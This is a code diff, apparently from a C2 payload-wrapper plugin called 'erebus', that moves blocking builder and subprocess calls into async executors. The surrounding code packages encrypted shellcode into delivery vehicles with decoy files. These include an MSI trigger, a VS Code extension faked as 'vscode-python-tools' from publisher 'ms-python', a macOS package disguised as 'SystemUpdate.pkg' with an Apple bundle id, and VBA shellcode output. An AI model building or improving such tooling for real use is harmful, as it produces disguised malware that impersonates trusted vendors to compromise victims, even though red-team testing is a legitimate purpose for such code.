@@ -3523,10 +3523,11 @@ generated if none have been entered.""",
         with zipfile.ZipFile(master_buf, "w", zipfile.ZIP_DEFLATED) as mz:
 
             # ── Trigger variants ──────────────────────────────────────────────
+            _loop = asyncio.get_running_loop()
             for tag, tfn in trigger_specs:
                 work = _fresh_build(tag)
                 try:
-                    tfn(work)
+                    await _loop.run_in_executor(None, tfn, work)
                     data = _zip_dir(work / "payload")
                     mz.writestr(f"triggers/{tag}/payload_{tag.lower()}.zip", data)
                     manifest_lines.append(f"  triggers/{tag}/payload_{tag.lower()}.zip  - OK")
@@ -3547,7 +3548,7 @@ generated if none have been entered.""",
                     create_bat_payload_trigger(
                         target_bin=_cmd_bin, args=_cmd_args,
                         payload_dir=work / "payload", decoy_file=decoy_file)
-                    out_path = cfn(work)
+                    out_path = await _loop.run_in_executor(None, cfn, work)
                     if out_path and Path(out_path).exists():
                         suffix = Path(out_path).suffix
                         arc_name = f"containers/{tag}/payload_{tag.lower()}{suffix}"
@@ -3642,7 +3643,9 @@ generated if none have been entered.""",
         inner_path = await self._build_inner_container(agent_build_path)
         outer = (self.get_parameter("3.0T Outer Transport") or "None").strip()
         if inner_path and outer != "None":
-            inner_path = self._wrap_in_outer_transport(inner_path, outer)
+            inner_path = await asyncio.get_running_loop().run_in_executor(
+                None, self._wrap_in_outer_transport, inner_path, outer
+            )
         return inner_path
 
     async def _build_inner_container(self, agent_build_path):
@@ -4081,7 +4084,15 @@ generated if none have been entered.""",
                         encoding_method=(ENCODING_METHODS[_enc2] if _enc2 and _enc2 != "NONE" else None),
                         encryption_key=self.get_parameter("2.2 Encryption Key"),
                     )
-                    shellcode_src = subprocess.check_output(key_cmd, text=True)
+                    _proc = await asyncio.create_subprocess_exec(
+                        *key_cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    _out, _err = await _proc.communicate()
+                    if _proc.returncode != 0:
+                        raise subprocess.CalledProcessError(_proc.returncode, key_cmd, _out, _err)
+                    shellcode_src = _out.decode()
                     _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
                     if _key_parsed is not None:
                         encryption_key_bytes = _key_parsed
@@ -4153,7 +4164,15 @@ generated if none have been entered.""",
                         encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                         encryption_key=self.get_parameter("2.2 Encryption Key"),
                     )
-                    shellcode_src = subprocess.check_output(cmd, text=True)
+                    _proc = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    _out, _err = await _proc.communicate()
+                    if _proc.returncode != 0:
+                        raise subprocess.CalledProcessError(_proc.returncode, cmd, _out, _err)
+                    shellcode_src = _out.decode()
                     output += shellcode_src
                     key_array = extract_raw_key_array(shellcode_src)
                     output += key_array
@@ -5356,7 +5375,14 @@ generated if none have been entered.""",
                             if self.get_parameter("2.0 Compression Type") != "NONE":
                                 cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
 
-                            subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
+                            _proc = await asyncio.create_subprocess_exec(
+                                *cmd,
+                                stdout=asyncio.subprocess.PIPE,
+                                stderr=asyncio.subprocess.PIPE,
+                            )
+                            _out, _err = await _proc.communicate()
+                            if _proc.returncode != 0:
+                                raise subprocess.CalledProcessError(_proc.returncode, cmd, _out + _err)
 
                             shellcode_vba = open(vba_tmp, 'r').read()
                             os.unlink(vba_tmp)
@@ -5753,10 +5779,12 @@ generated if none have been entered.""",
                             )
 
                         case "MSI":
-                            trigger_path= create_msi_payload_trigger(
-                                payload_exe="erebus.exe",
-                                payload_dir=payload_dir,
-                                decoy_file=decoy_file
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_msi_payload_trigger(
+                                    payload_exe="erebus.exe",
+                                    payload_dir=payload_dir,
+                                    decoy_file=decoy_file,
+                                )
                             )
                         case "ClickOnce":
                             trigger_path = await create_clickonce_trigger(
@@ -5821,14 +5849,19 @@ generated if none have been entered.""",
                                     _vsix_prebuilt = pathlib.Path(payload_output_file)
                             except NameError:
                                 pass
-                            trigger_path = create_vscode_ext_trigger(
-                                shellcode_path=pathlib.Path(mythic_shellcode_path),
-                                payload_dir=payload_dir,
-                                decoy_file=decoy_file,
-                                fake_name=self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools",
-                                publisher=self.get_parameter("0.9x VSCode Publisher") or "ms-python",
-                                output_filename="installer.vsix",
-                                prebuilt_dll_path=_vsix_prebuilt,
+                            _vscode_fake_name = self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools"
+                            _vscode_publisher = self.get_parameter("0.9x VSCode Publisher") or "ms-python"
+                            _vscode_sc_path = pathlib.Path(mythic_shellcode_path)
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_vscode_ext_trigger(
+                                    shellcode_path=_vscode_sc_path,
+                                    payload_dir=payload_dir,
+                                    decoy_file=decoy_file,
+                                    fake_name=_vscode_fake_name,
+                                    publisher=_vscode_publisher,
+                                    output_filename="installer.vsix",
+                                    prebuilt_dll_path=_vsix_prebuilt,
+                                )
                             )
 
                             if trigger_path and pathlib.Path(trigger_path).exists():
@@ -6017,12 +6050,14 @@ generated if none have been entered.""",
 
                         case "PKG":
                             _pkg_payload = payload_dir / "payload"
-                            trigger_path = create_pkg_trigger(
-                                payload_path=str(_pkg_payload),
-                                output_dir=str(payload_dir),
-                                payload_dir=payload_dir,
-                                pkg_name="SystemUpdate.pkg",
-                                bundle_id="com.apple.systemupdate",
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_pkg_trigger(
+                                    payload_path=str(_pkg_payload),
+                                    output_dir=str(payload_dir),
+                                    payload_dir=payload_dir,
+                                    pkg_name="SystemUpdate.pkg",
+                                    bundle_id="com.apple.systemupdate",
+                                )
                             )
 
                     if trigger_path:
